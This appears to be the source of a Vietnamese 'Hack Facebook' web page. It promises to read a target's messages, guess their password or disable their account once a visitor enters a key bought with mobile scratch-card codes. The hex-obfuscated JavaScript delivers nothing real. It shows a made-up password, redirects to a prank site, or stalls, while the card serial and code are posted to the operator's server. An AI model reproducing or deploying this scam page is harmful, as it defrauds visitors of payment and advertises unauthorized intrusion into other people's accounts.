<script>
var _0x5164=["\x74\x65\x78\x74\x43\x6F\x6E\x74\x65\x6E\x74","\x63\x6F\x75\x6E\x74\x64\x6F\x77\x6E","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64","\x68\x72\x65\x66","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x67\x65\x65\x6B\x70\x72\x61\x6E\x6B\x2E\x63\x6F\x6D\x2F\x68\x61\x63\x6B\x65\x72\x2F","\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x61\x6C\x65\x72\x74\x20\x61\x6C\x65\x72\x74\x2D\x73\x75\x63\x63\x65\x73\x73\x22\x3E\x4D\u1EAD\x74\x20\x6B\x68\u1EA9\x75\x20\x6D\u1EDB\x69\x20\x6C\xE0\x3A\x20\x3C\x62\x3E\x63\x68\x65\x63\x6B\x70\x61\x73\x73\x2E\x69\x6E\x66\x6F","\x72\x61\x6E\x64\x6F\x6D","\x66\x6C\x6F\x6F\x72","\x3C\x2F\x62\x3E\x3C\x2F\x64\x69\x76\x3E","\x68\x74\x6D\x6C","\x23\x72\x65\x73","\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x61\x6C\x65\x72\x74\x20\x61\x6C\x65\x72\x74\x2D\x64\x61\x6E\x67\x65\x72\x22\x3E\x48\xEC\x6E\x68\x20\x6E\x68\u01B0\x20\x62\u1EA1\x6E\x20\x74\x68\u1EE9\x63\x20\x68\x69\u1EC7\x6E\x20\x71\x75\xE1\x20\x6E\x68\x61\x6E\x68\x20\x76\x75\x69\x20\x6C\xF2\x6E\x67\x20\x6C\xE0\x6D\x20\x63\x68\u1EAD\x6D\x20\x6C\u1EA1\x69\x21\x3C\x2F\x64\x69\x76\x3E","\x76\x61\x6C","\x23\x6B\x65\x79","\x23\x6C\x69\x6E\x6B","\x23\x74\x79\x70\x65","","\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x61\x6C\x65\x72\x74\x20\x61\x6C\x65\x72\x74\x2D\x64\x61\x6E\x67\x65\x72\x22\x3E\x56\x75\x69\x20\x6C\xF2\x6E\x67\x20\x3C\x62\x3E\x6E\x68\u1EAD\x70\x20\x6B\x65\x79\x3C\x2F\x62\x3E\x21\x3C\x2F\x64\x69\x76\x3E","\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x61\x6C\x65\x72\x74\x20\x61\x6C\x65\x72\x74\x2D\x64\x61\x6E\x67\x65\x72\x22\x3E\x56\x75\x69\x20\x6C\xF2\x6E\x67\x20\x3C\x62\x3E\x6E\x68\u1EAD\x70\x20\x6C\x69\x6E\x6B\x3C\x2F\x62\x3E\x21\x3C\x2F\x64\x69\x76\x3E","\x50\x4F\x53\x54","\x2F\x71\x75\x61\x6E\x74\x6F\x6F\x2F\x63\x68\x65\x63\x6B\x70\x61\x73\x73\x2E\x70\x68\x70","\u0110\x41\x4E\x47\x20\x58\u1EEC\x20\x4C\xDD\x2E\x2E\x2E","\x23\x73\x75\x62\x6D\x69\x74","\x48\x41\x43\x4B\x20\x4E\x47\x41\x59","\x61\x6A\x61\x78"];
function timedown(_0x14d2x2)
{
	var _0x14d2x3=_0x14d2x2;
	var _0x14d2x4=setInterval(function()
	{
		_0x14d2x3--;document[_0x5164[2]](_0x5164[1])[_0x5164[0]]= _0x14d2x3;if(_0x14d2x3<= 0)
		{
			clearInterval(_0x14d2x4);location[_0x5164[3]]= _0x5164[4]
		}
	}
	,1000)
}
function timedown2(_0x14d2x2)
{
	var _0x14d2x3=_0x14d2x2;
	var _0x14d2x4=setInterval(function()
	{
		_0x14d2x3--;document[_0x5164[2]](_0x5164[1])[_0x5164[0]]= _0x14d2x3;if(_0x14d2x3<= 0)
		{
			clearInterval(_0x14d2x4);$(_0x5164[10])[_0x5164[9]](_0x5164[5]+ Math[_0x5164[7]](Math[_0x5164[6]]()* 1000)+ 1+ _0x5164[8])
		}
	}
	,1000)
}
function timedown3(_0x14d2x2)
{
	var _0x14d2x3=_0x14d2x2;
	var _0x14d2x4=setInterval(function()
	{
		_0x14d2x3--;document[_0x5164[2]](_0x5164[1])[_0x5164[0]]= _0x14d2x3;if(_0x14d2x3<= 0)
		{
			clearInterval(_0x14d2x4);$(_0x5164[10])[_0x5164[9]](_0x5164[11])
		}
	}
	,1000)
}
function checkpass()
{
	var _0x14d2x8=$(_0x5164[13])[_0x5164[12]]();
	var _0x14d2x9=$(_0x5164[14])[_0x5164[12]]();
	var _0x14d2xa=$(_0x5164[15])[_0x5164[12]]();
	if(_0x14d2x8== _0x5164[16])
	{
		$(_0x5164[10])[_0x5164[9]](_0x5164[17]);return
	}
	if(_0x14d2x9== _0x5164[16])
	{
		$(_0x5164[10])[_0x5164[9]](_0x5164[18]);return
	}
	$[_0x5164[24]]({type:_0x5164[19],url:_0x5164[20],data:{key:_0x14d2x8,link:_0x14d2x9,type:_0x14d2xa},beforeSend:function()
	{
		$(_0x5164[22])[_0x5164[9]](_0x5164[21])
	}
	,success:function(_0x14d2xb)
	{
		if(_0x14d2xa== 1)
		{
			timedown(10)
		}
		if(_0x14d2xa== 2)
		{
			timedown2(20)
		}
		if(_0x14d2xa== 4)
		{
			timedown3(30)
		}
		$(_0x5164[10])[_0x5164[9]](_0x14d2xb);$(_0x5164[22])[_0x5164[9]](_0x5164[23])
	}
	})
}

</script>
<div class="row">
                    <div class="col-md-12">
                        <h1 class="page-head-line text-center"> HACK FACEBOOK </h1>
                        <h1 class="page-subhead-line"><? echo $site[desc] ?></h1>

                    </div>
                </div>
                <!-- /. ROW  -->
             
            <div class="row">
                <div class="col-md-6">
                    <div class="panel panel-primary">
                        <div class="panel-heading">
                            Phần Mềm Hack Facebook Online
                        </div>
                        <div class="panel-body">
              <form role="form">
                                        <div class="form-group">
                                            <label>Nhập key:</label>
                                            <input id="key" class="form-control" type="text" placeholder="Nhập key mà bạn đã mua tại shop.">
                                            <p class="help-block">Nếu chưa mua hãy mua bên dưới</p>
                                        </div>
                                 <div class="form-group">
                                            <label>Nhập link Facebook:</label>
                                            <input id="link" class="form-control" type="text" placeholder="VD: https://www.facebook.com/10004626262728">                                     
                                        </div>
                                            <div class="form-group">
                                            <label>Bạn muốn hack gì ?</label>
                                            <select class="form-control" id="type">
                                                <option value="1">Đọc trộm tin nhắn</option>
                                                <option value="2">Dò mật khẩu</option>
                                                <option value="3">Vô hiệu hoá tài khoản</option>
                                                <option value="4">Lọc tài khoản game trong tin nhắn</option>
                                            </select>
                                        </div>
                                  
                                 
                                        <center><button id="submit" type="button" onclick="checkpass()" class="btn btn-primary">HACK NGAY</button></center>

                                    </form>
<br />
<div class="form-group">                                           
<div class="text-center" id="res"></div>
</div>              
                        </div>
                    </div>
<div class="panel panel-warning">
                        <div class="panel-heading">
                           MUA KEY HACK
                        </div>
                        <div class="panel-body">
                       <!-- FORM --> 
                               <div class="form-group">
                    <label for="menhgia">Loại thẻ</label>
                    <select name="loaithe" id="loaithe" class="form-control input-lg" required="required">
                        <option value="VIETTEL">Viettel</option>
                        <option value="VINAPHONE">Vinaphone</option>
                        <option value="MOBIFONE">Mobifone</option>
                       <option value="ZING">Zing</option>
                    </select>
                </div>
                <div class="form-group">
                    <label for="menhgia">Mệnh giá thẻ</label>
                    <select name="menhgia" id="menhgia" class="form-control input-lg" required="required">
                        
                        <option value="100000">100,000 - 1 Lần dùng</option>
                        <option value="200000">200,000 - 10 Ngày dùng </option>
                        <option value="300000">300,000 - 01 Tuần dùng </option>
                        <option value="500000">500,000 - 01 Tháng dùng</option>
                        <option value="1000000">1,000,000 - Vĩnh Viễn </option>
                    </select>
                </div>
                <div class="form-group">
                    <label for="seri">Số Seri:</label>
                    <input type="text" class="form-control input-lg" name="seri" id="seri" placeholder="Nhập số seri in trên thẻ..."> </div>
                <div class="form-group">
                    <label for="mathe">Mã thẻ:</label>
                    <input type="text" class="form-control input-lg" name="mathe" id="mathe" placeholder="Nhập mã thẻ cào..."> </div>
                <div class="form-group" style="text-align: center;"> </div>
                <div class="form-group">
                    <button type="button" onclick="naptien()" id="napthe" class="btn btn-block btn-warning" data-loading-text="<i class='fa fa-spinner fa-spin'></i> Đang xử lý, xin chờ...">MUA KEY</button>
                </div>
                <div style="display:none" id="error-msg" class="error-msg alert alert-danger" style="text-align: center;"></div>
                <div id="result" style="text-align: center;"></div>  

                      <!--/FORM-->
                            </div>
                        </div>

                </div>
            </div>
            

<script>
var _0x778c=["\x64\x69\x73\x70\x6C\x61\x79","\x62\x6C\x6F\x63\x6B","\x63\x73\x73","\x2E\x65\x72\x72\x6F\x72\x2D\x6D\x73\x67","\x76\x61\x6C","\x23\x6C\x6F\x61\x69\x74\x68\x65","\x69\x6E\x70\x75\x74\x5B\x6E\x61\x6D\x65\x3D\x73\x65\x72\x69\x5D","\x69\x6E\x70\x75\x74\x5B\x6E\x61\x6D\x65\x3D\x6D\x61\x74\x68\x65\x5D","\x23\x6D\x65\x6E\x68\x67\x69\x61","","\x3C\x73\x74\x72\x6F\x6E\x67\x3E\x4C\u1ED7\x69\x3A\x3C\x2F\x73\x74\x72\x6F\x6E\x67\x3E\x20\x50\x68\u1EA3\x69\x20\x63\x68\u1ECD\x6E\x20\x6D\u1EC7\x6E\x68\x20\x67\x69\xE1\x20\x74\x68\u1EBB","\x68\x74\x6D\x6C","\x3C\x73\x74\x72\x6F\x6E\x67\x3E\x4C\u1ED7\x69\x3A\x3C\x2F\x73\x74\x72\x6F\x6E\x67\x3E\x20\x42\u1EA1\x6E\x20\x63\x68\u01B0\x61\x20\x63\x68\u1ECD\x6E\x20\x6C\x6F\u1EA1\x69\x20\x74\x68\u1EBB","\x6C\x65\x6E\x67\x74\x68","\x3C\x73\x74\x72\x6F\x6E\x67\x3E\x4C\u1ED7\x69\x3A\x3C\x2F\x73\x74\x72\x6F\x6E\x67\x3E\x20\x4D\xE3\x20\x74\x68\u1EBB\x20\x6B\x68\xF4\x6E\x67\x20\x68\u1EE3\x70\x20\x6C\u1EC7","\x6D\x61\x74\x68\x65\x3A\x20","\x6C\x65\x6E\x67\x74\x68\x3A\x20","\x6C\x6F\x67","\x2F\x71\x75\x61\x6E\x74\x6F\x6F\x2F\x74\x68\x61\x6E\x68\x74\x6F\x61\x6E\x2E\x70\x68\x70","\x50\x4F\x53\x54","\x6C\x6F\x61\x64\x69\x6E\x67","\x62\x75\x74\x74\x6F\x6E","\x23\x6E\x61\x70\x74\x68\x65","\x6E\x6F\x6E\x65","\x70\x61\x72\x73\x65","\x73\x74\x61\x74\x75\x73","\x3C\x70\x20\x63\x6C\x61\x73\x73\x3D\x22\x61\x6C\x65\x72\x74\x20\x61\x6C\x65\x72\x74\x2D\x77\x61\x72\x6E\x69\x6E\x67\x22\x3E","\x6D\x65\x73\x73","\x3C\x2F\x70\x3E","\x23\x72\x65\x73\x75\x6C\x74","\x3C\x70\x20\x63\x6C\x61\x73\x73\x3D\x22\x61\x6C\x65\x72\x74\x20\x61\x6C\x65\x72\x74\x2D\x73\x75\x63\x63\x65\x73\x73\x22\x3E","\x3C\x70\x20\x63\x6C\x61\x73\x73\x3D\x22\x61\x6C\x65\x72\x74\x20\x61\x6C\x65\x72\x74\x2D\x64\x61\x6E\x67\x65\x72\x20\x74\x65\x6E\x74\x6B\x22\x3E\x4C\u1ED7\x69\x3A\x20\x68\u1EC7\x20\x74\x68\u1ED1\x6E\x67\x20\u0111\x61\x6E\x67\x20\x62\u1EA3\x6F\x20\x74\x72\xEC\x2C\x20\x76\x75\x69\x20\x6C\xF2\x6E\x67\x20\x74\x68\u1EED\x20\x6C\u1EA1\x69\x20\x73\x61\x75\x20\x68\x6F\u1EB7\x63\x20\x74\x68\u1EED\x20\x73\x65\x72\x76\x65\x72\x20\x6B\x68\xE1\x63\x3C\x2F\x70\x3E","\x23\x74\x68\x6F\x6E\x67\x62\x61\x6F\x6C\x6F\x69","\x72\x65\x73\x65\x74","\x61\x6A\x61\x78","\x74\x65\x78\x74\x43\x6F\x6E\x74\x65\x6E\x74","\x63\x6F\x75\x6E\x74\x64\x6F\x77\x6E","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64","\x53\x61\x69\x20\x73\x65\x72\x69\x61\x6C\x20\x76\x75\x69\x20\x6C\xF2\x6E\x67\x20\x78\x65\x6D\x20\x6C\u1EA1\x69\x2E","\x68\x72\x65\x66","\x2F"];
function naptien()
{
	$(_0x778c[3])[_0x778c[2]](_0x778c[0],_0x778c[1]);var _0x3a35x2=$(_0x778c[5])[_0x778c[4]]();
	var _0x3a35x3=$(_0x778c[6])[_0x778c[4]]();
	var _0x3a35x4=$(_0x778c[7])[_0x778c[4]]();
	var _0x3a35x5=$(_0x778c[8])[_0x778c[4]]();
	if(_0x3a35x5== _0x778c[9])
	{
		$(_0x778c[3])[_0x778c[11]](_0x778c[10]);return
	}
	if(_0x3a35x2== _0x778c[9])
	{
		$(_0x778c[3])[_0x778c[11]](_0x778c[12]);return false
	}
	if(_0x3a35x4[_0x778c[13]]< 10|| _0x3a35x4[_0x778c[13]]> 15)
	{
		$(_0x778c[3])[_0x778c[11]](_0x778c[14]);console[_0x778c[17]](_0x778c[15]+ _0x3a35x4+ _0x778c[16]+ _0x3a35x4[_0x778c[13]]);return false
	}
	$[_0x778c[34]]({url:_0x778c[18],type:_0x778c[19],data:{loaithe:_0x3a35x2,menhgia:_0x3a35x5,seri:_0x3a35x3,mathe:_0x3a35x4},beforeSend:function()
	{
		$(_0x778c[22])[_0x778c[21]](_0x778c[20])
	}
	,success:function(_0x3a35x6)
	{
		if(_0x3a35x6)
		{
			$(_0x778c[3])[_0x778c[2]](_0x778c[0],_0x778c[23]);try
			{
				respond= JSON[_0x778c[24]](_0x3a35x6);if(respond[_0x778c[25]]== false)
				{
					$(_0x778c[29])[_0x778c[11]](_0x778c[26]+ respond[_0x778c[27]]+ _0x778c[28]);time1(10)
				}
				else 
				{
					$(_0x778c[29])[_0x778c[11]](_0x778c[30]+ respond[_0x778c[27]]+ _0x778c[28])
				}
			}
			catch(e)
			{
				$(_0x778c[32])[_0x778c[11]](_0x778c[31])
			}
		}
		$(_0x778c[22])[_0x778c[21]](_0x778c[33]);grecaptcha[_0x778c[33]]()
	}
	})
}
function time1(_0x3a35x8)
{
	var _0x3a35x9=_0x3a35x8;
	var _0x3a35xa=setInterval(function()
	{
		_0x3a35x9--;document[_0x778c[37]](_0x778c[36])[_0x778c[35]]= _0x3a35x9;if(_0x3a35x9<= 0)
		{
			clearInterval(_0x3a35xa);alert(_0x778c[38]);location[_0x778c[39]]= _0x778c[40]
		}
	}
	,1000)
}

</script>